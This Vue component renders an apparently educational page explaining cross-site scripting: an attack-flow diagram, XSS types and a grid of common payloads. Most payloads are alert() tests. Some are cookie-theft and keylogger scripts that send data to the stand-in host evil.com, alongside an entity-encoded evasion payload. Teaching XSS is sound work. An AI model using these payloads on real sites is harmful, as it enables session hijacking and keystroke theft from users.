<template>
  <div class="how-it-works-view">
    <div class="page-header">
      <h1>{{ t.howItWorks.title }}</h1>
      <p>{{ t.howItWorks.subtitle }}</p>
    </div>

    <div class="steps-flow">
      <div v-for="(step, i) in steps" :key="i" class="step-item">
        <div class="step-number">{{ i + 1 }}</div>
        <h3>{{ step.title }}</h3>
        <p>{{ step.desc }}</p>
      </div>
    </div>

    <Card class="attack-flow-card">
      <template #content>
        <h2><i class="pi pi-share-alt"></i> XSS Attack Flow</h2>
        <div class="flow-diagram">
          <div class="flow-item attacker">
            <i class="pi pi-user"></i>
            <span>Attacker</span>
          </div>
          <div class="flow-arrow">
            <i class="pi pi-arrow-right"></i>
            <small>Injects payload</small>
          </div>
          <div class="flow-item server">
            <i class="pi pi-server"></i>
            <span>Web Server</span>
          </div>
          <div class="flow-arrow">
            <i class="pi pi-arrow-right"></i>
            <small>Serves page</small>
          </div>
          <div class="flow-item victim">
            <i class="pi pi-user"></i>
            <span>Victim</span>
          </div>
          <div class="flow-arrow">
            <i class="pi pi-arrow-right"></i>
            <small>Data stolen</small>
          </div>
          <div class="flow-item attacker">
            <i class="pi pi-user"></i>
            <span>Attacker</span>
          </div>
        </div>
      </template>
    </Card>

    <Card class="types-card">
      <template #content>
        <h2><i class="pi pi-list"></i> {{ t.howItWorks.xssTypes.title }}</h2>
        <div class="types-grid">
          <div class="type-item reflected">
            <div class="type-header">
              <i class="pi pi-replay"></i>
              <h3>{{ t.howItWorks.xssTypes.reflected.name }}</h3>
            </div>
            <div class="type-detail">
              <span class="label">Vector:</span>
              <span>{{ t.howItWorks.xssTypes.reflected.vector }}</span>
            </div>
            <div class="type-detail">
              <span class="label">Persistence:</span>
              <span>{{ t.howItWorks.xssTypes.reflected.persistence }}</span>
            </div>
            <div class="type-detail">
              <span class="label">Example:</span>
              <span>{{ t.howItWorks.xssTypes.reflected.example }}</span>
            </div>
          </div>

          <div class="type-item stored">
            <div class="type-header">
              <i class="pi pi-database"></i>
              <h3>{{ t.howItWorks.xssTypes.stored.name }}</h3>
            </div>
            <div class="type-detail">
              <span class="label">Vector:</span>
              <span>{{ t.howItWorks.xssTypes.stored.vector }}</span>
            </div>
            <div class="type-detail">
              <span class="label">Persistence:</span>
              <span>{{ t.howItWorks.xssTypes.stored.persistence }}</span>
            </div>
            <div class="type-detail">
              <span class="label">Example:</span>
              <span>{{ t.howItWorks.xssTypes.stored.example }}</span>
            </div>
          </div>

          <div class="type-item dom">
            <div class="type-header">
              <i class="pi pi-sitemap"></i>
              <h3>{{ t.howItWorks.xssTypes.dom.name }}</h3>
            </div>
            <div class="type-detail">
              <span class="label">Vector:</span>
              <span>{{ t.howItWorks.xssTypes.dom.vector }}</span>
            </div>
            <div class="type-detail">
              <span class="label">Persistence:</span>
              <span>{{ t.howItWorks.xssTypes.dom.persistence }}</span>
            </div>
            <div class="type-detail">
              <span class="label">Example:</span>
              <span>{{ t.howItWorks.xssTypes.dom.example }}</span>
            </div>
          </div>
        </div>
      </template>
    </Card>

    <Card class="payloads-card">
      <template #content>
        <h2><i class="pi pi-bolt"></i> Common XSS Payloads</h2>
        <div class="payloads-grid">
          <div class="payload-item">
            <h4>Basic Alert</h4>
            <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
          </div>
          <div class="payload-item">
            <h4>IMG Tag Error</h4>
            <code>&lt;img src=x onerror="alert('XSS')"&gt;</code>
          </div>
          <div class="payload-item">
            <h4>SVG Onload</h4>
            <code>&lt;svg onload="alert('XSS')"&gt;</code>
          </div>
          <div class="payload-item">
            <h4>Body Onload</h4>
            <code>&lt;body onload="alert('XSS')"&gt;</code>
          </div>
          <div class="payload-item">
            <h4>Input Autofocus</h4>
            <code>&lt;input onfocus="alert('XSS')" autofocus&gt;</code>
          </div>
          <div class="payload-item">
            <h4>Event Handler</h4>
            <code>&lt;div onmouseover="alert('XSS')"&gt;Hover&lt;/div&gt;</code>
          </div>
          <div class="payload-item">
            <h4>Cookie Theft</h4>
            <code>&lt;script&gt;new Image().src="http://evil.com/?c="+document.cookie&lt;/script&gt;</code>
          </div>
          <div class="payload-item">
            <h4>Keylogger</h4>
            <code>&lt;script&gt;document.onkeypress=function(e){fetch('http://evil.com/log?k='+e.key)}&lt;/script&gt;</code>
          </div>
          <div class="payload-item">
            <h4>Redirect</h4>
            <code>&lt;script&gt;location='http://evil.com'&lt;/script&gt;</code>
          </div>
          <div class="payload-item">
            <h4>iFrame Injection</h4>
            <code>&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</code>
          </div>
          <div class="payload-item">
            <h4>Encoded Payload</h4>
            <code>&lt;img src=x onerror="&#97;&#108;&#101;&#114;&#116;('XSS')"&gt;</code>
          </div>
          <div class="payload-item">
            <h4>URL Parameter</h4>
            <code>?search=&lt;script&gt;alert(1)&lt;/script&gt;</code>
          </div>
        </div>
      </template>
    </Card>

    <Card class="faq-card">
      <template #content>
        <h2><i class="pi pi-question-circle"></i> FAQ</h2>
        <Accordion>
          <AccordionPanel v-for="(faq, i) in faqs" :key="i" :value="i">
            <AccordionHeader>{{ faq.question }}</AccordionHeader>
            <AccordionContent><p>{{ faq.answer }}</p></AccordionContent>
          </AccordionPanel>
        </Accordion>
      </template>
    </Card>
  </div>
</template>

<script>
import { computed } from 'vue'

export default {
  props: { t: Object, language: String },
  setup(props) {
    const steps = computed(() => [
      props.t.howItWorks.steps.step1,
      props.t.howItWorks.steps.step2,
      props.t.howItWorks.steps.step3,
      props.t.howItWorks.steps.step4,
      props.t.howItWorks.steps.step5
    ])

    const faqs = computed(() => [
      props.t.howItWorks.faq.q1,
      props.t.howItWorks.faq.q2,
      props.t.howItWorks.faq.q3,
      props.t.howItWorks.faq.q4
    ])

    return { steps, faqs }
  }
}
</script>

<style scoped>
.how-it-works-view {
  max-width: 1000px;
  margin: 0 auto;
}

.page-header {
  text-align: center;
  margin-bottom: 2rem;
}

.steps-flow {
  display: flex;
  justify-content: space-between;
  margin-bottom: 2rem;
  position: relative;
}

.steps-flow::before {
  content: '';
  position: absolute;
  top: 20px;
  left: 40px;
  right: 40px;
  height: 2px;
  background: var(--border-color);
  z-index: 0;
}

.step-item {
  text-align: center;
  position: relative;
  z-index: 1;
  flex: 1;
  padding: 0 0.5rem;
}

.step-number {
  width: 40px;
  height: 40px;
  background: #f97316;
  color: white;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0 auto 0.75rem;
  font-weight: 700;
}

.step-item h3 {
  font-size: 0.9rem;
  margin-bottom: 0.5rem;
}

.step-item p {
  font-size: 0.8rem;
  color: var(--text-secondary);
}

.attack-flow-card,
.types-card,
.payloads-card,
.faq-card {
  margin-bottom: 1.5rem;
}

.attack-flow-card h2,
.types-card h2,
.payloads-card h2,
.faq-card h2 {
  display: flex;
  align-items: center;
  gap: 0.5rem;
  margin-bottom: 1.5rem;
}

.attack-flow-card h2 i { color: #ef4444; }
.types-card h2 i { color: #f97316; }
.payloads-card h2 i { color: #8b5cf6; }
.faq-card h2 i { color: #3b82f6; }

.payloads-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
  gap: 1rem;
}

.payload-item {
  background: var(--bg-primary);
  padding: 1rem;
  border-radius: 8px;
  border-left: 3px solid #8b5cf6;
}

.payload-item h4 {
  font-size: 0.85rem;
  color: #8b5cf6;
  margin-bottom: 0.5rem;
}

.payload-item code {
  display: block;
  font-family: 'Monaco', monospace;
  font-size: 0.75rem;
  background: #1e1e2e;
  color: #f97316;
  padding: 0.5rem;
  border-radius: 4px;
  overflow-x: auto;
  white-space: nowrap;
}

.flow-diagram {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 0.5rem;
  flex-wrap: wrap;
  padding: 1rem;
}

.flow-item {
  text-align: center;
  padding: 1rem;
  border-radius: 12px;
  min-width: 80px;
}

.flow-item.attacker {
  background: rgba(239, 68, 68, 0.1);
  border: 2px solid #ef4444;
}

.flow-item.server {
  background: rgba(59, 130, 246, 0.1);
  border: 2px solid #3b82f6;
}

.flow-item.victim {
  background: rgba(34, 197, 94, 0.1);
  border: 2px solid #22c55e;
}

.flow-item i {
  font-size: 1.5rem;
  display: block;
  margin-bottom: 0.5rem;
}

.flow-item.attacker i { color: #ef4444; }
.flow-item.server i { color: #3b82f6; }
.flow-item.victim i { color: #22c55e; }

.flow-arrow {
  display: flex;
  flex-direction: column;
  align-items: center;
  color: var(--text-secondary);
}

.flow-arrow i {
  font-size: 1.25rem;
  color: #f97316;
}

.flow-arrow small {
  font-size: 0.7rem;
}

.types-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
  gap: 1.5rem;
}

.type-item {
  padding: 1.5rem;
  border-radius: 12px;
  border-left: 4px solid;
}

.type-item.reflected {
  background: rgba(239, 68, 68, 0.05);
  border-color: #ef4444;
}

.type-item.stored {
  background: rgba(249, 115, 22, 0.05);
  border-color: #f97316;
}

.type-item.dom {
  background: rgba(139, 92, 246, 0.05);
  border-color: #8b5cf6;
}

.type-header {
  display: flex;
  align-items: center;
  gap: 0.75rem;
  margin-bottom: 1rem;
}

.type-item.reflected .type-header i { color: #ef4444; }
.type-item.stored .type-header i { color: #f97316; }
.type-item.dom .type-header i { color: #8b5cf6; }

.type-header i {
  font-size: 1.5rem;
}

.type-detail {
  display: flex;
  gap: 0.5rem;
  margin-bottom: 0.5rem;
  font-size: 0.9rem;
}

.type-detail .label {
  font-weight: 600;
  color: var(--text-secondary);
  min-width: 90px;
}

@media (max-width: 768px) {
  .steps-flow {
    flex-direction: column;
    gap: 1rem;
  }

  .steps-flow::before {
    display: none;
  }

  .flow-diagram {
    flex-direction: column;
  }

  .flow-arrow {
    transform: rotate(90deg);
  }
}
</style>
